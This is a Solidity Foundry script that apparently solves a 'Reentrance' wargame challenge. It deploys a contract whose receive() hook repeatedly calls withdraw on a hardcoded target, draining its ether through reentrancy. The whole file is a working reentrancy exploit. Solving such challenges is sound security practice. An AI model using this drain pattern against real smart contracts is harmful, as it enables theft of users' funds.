// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Reentrance.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Player {
    Reentrance public reentrance;

    constructor(Reentrance _reentranceInstance) public payable {
        reentrance = _reentranceInstance;
        reentrance.donate{value: 0.001 ether}(address(this));
        reentrance.withdraw(0.001 ether);
    }

    receive() external payable {
        uint256 bal = reentrance.balances(address(this));
        if (bal > 0) {
            reentrance.withdraw(bal);
        }
    }


}


contract ReentranceSolution is Script {

    Reentrance public reentranceInstance = Reentrance(0x515B6D9199c05EEfaD685A2EaF0fFF1D99436Ddd);

    address myAddress = vm.envAddress("PUBLIC_KEY");

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Player{value: 0.001 ether}(reentranceInstance);

        vm.stopBroadcast();
    }
}
